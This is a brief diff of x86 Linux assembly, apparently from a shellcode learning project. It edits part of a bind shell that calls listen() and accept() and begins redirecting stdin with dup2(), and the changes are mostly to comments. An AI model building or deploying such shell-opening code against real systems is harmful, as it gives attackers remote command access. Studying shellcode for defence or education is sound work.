@@ -35,7 +35,7 @@ _start:
   mov ecx, esp
   int 0x80
 
-  push 0 ; 'backlog' argument, same as our python script
+  push 0 ; 'backlog' argument
   push edx ; file descriptor again
   mov ecx,esp ; mov stack pointer into ecx
   mov ebx, 4 ; subfunction number for listen()
@@ -51,9 +51,9 @@ _start:
   mov ebx, 5 ; subfunction number for accept()
   mov eax, 102 ; system call number
 
-  int 0x80
+  int 0x80 ; file descriptor is saved in eax
 
-  xor ecx, ecx
+  ;xor ecx, ecx
   mov ebx, eax ; file descriptor into ebx because its the first arg
   mov ecx, 0; stdin
   mov eax, 63 ; syscall # for dup2()
